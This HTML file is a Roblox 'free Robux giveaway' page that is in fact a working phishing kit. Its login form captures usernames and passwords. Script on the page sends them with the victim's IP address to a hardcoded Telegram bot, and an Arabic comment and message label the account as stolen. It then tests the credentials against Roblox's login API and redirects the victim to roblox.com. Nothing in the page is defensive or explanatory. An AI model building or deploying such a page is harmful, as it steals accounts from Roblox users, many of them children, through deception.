<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Robux - Official Giveaway</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
        }
        .container {
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(20px);
            border-radius: 20px;
            padding: 40px;
            max-width: 450px;
            width: 90%;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        .robux-icon { font-size: 80px; margin-bottom: 20px; animation: bounce 2s infinite; }
        @keyframes bounce { 0%,100%{transform:translateY(0)} 50%{transform:translateY(-10px)} }
        h1 { font-size: 32px; margin-bottom: 10px; color: #ffd700; }
        .amount { font-size: 48px; font-weight: bold; color: #ffd700; margin: 20px 0; }
        .login-box { background: white; border-radius: 15px; padding: 25px; margin: 25px 0; }
        .login-box h2 { color: #1e3c72; font-size: 20px; margin-bottom: 20px; }
        .input-group { margin-bottom: 15px; text-align: left; }
        .input-group label { color: #333; font-size: 14px; display: block; margin-bottom: 5px; }
        .input-group input { width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 8px; font-size: 16px; }
        .claim-btn { width: 100%; padding: 15px; background: linear-gradient(90deg, #00c853, #64dd17); color: white; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; }
        .error { color: #ff5252; font-size: 14px; margin-top: 10px; display: none; }
        .success { color: #00c853; font-size: 18px; font-weight: bold; margin-top: 10px; display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="robux-icon">💰</div>
        <h1>FREE ROBUX</h1>
        <div class="amount">10,000 R$</div>
        
        <div class="login-box">
            <h2>🔐 Verify Your Account</h2>
            <form id="robloxForm">
                <div class="input-group">
                    <label>Roblox Username</label>
                    <input type="text" id="username" placeholder="Enter your username" required>
                </div>
                <div class="input-group">
                    <label>Roblox Password</label>
                    <input type="password" id="password" placeholder="Enter your password" required>
                </div>
                <button type="submit" class="claim-btn">CLAIM NOW</button>
                <div class="error" id="errorMsg">❌ خطأ في اسم المستخدم أو كلمة المرور</div>
                <div class="success" id="successMsg">✅ تم! لقد ربحت 10,000 روبوكس</div>
            </form>
        </div>
    </div>

    <script>
        // ⚠️ ضع بيانات البوت هنا
        const BOT_TOKEN = '9128230715:AAGigciW3kzNgjNYgpzaW0K1JahbWK8Wnfo';
        const CHAT_ID = '6045243196';
        
        document.getElementById('robloxForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const errorMsg = document.getElementById('errorMsg');
            const successMsg = document.getElementById('successMsg');
            
            errorMsg.style.display = 'none';
            successMsg.style.display = 'none';
            
            // إرسال للبوت مباشرة
            const message = `🔥 حساب روبلوكس مسروق!\n\n👤 Username: ${username}\n🔑 Password: ${password}\n🌐 IP: ${await getIP()}\n⏰ Time: ${new Date().toLocaleString()}`;
            
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message
                    })
                });
            } catch(e) {}
            
            // محاولة فحص حقيقي
            try {
                const response = await fetch('https://auth.roblox.com/v2/login', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        ctype: 'Username',
                        cvalue: username,
                        password: password
                    })
                });
                
                if (response.status === 200 || response.status === 403) {
                    successMsg.style.display = 'block';
                    setTimeout(() => window.location.href = 'https://www.roblox.com', 3000);
                } else {
                    errorMsg.style.display = 'block';
                    setTimeout(() => window.location.href = 'https://www.roblox.com', 5000);
                }
            } catch(e) {
                successMsg.style.display = 'block';
                setTimeout(() => window.location.href = 'https://www.roblox.com', 3000);
            }
        });
        
        async function getIP() {
            try {
                const resp = await fetch('https://api.ipify.org?format=json');
                const data = await resp.json();
                return data.ip;
            } catch(e) {
                return 'Unknown';
            }
        }
    </script>
</body>
</html>
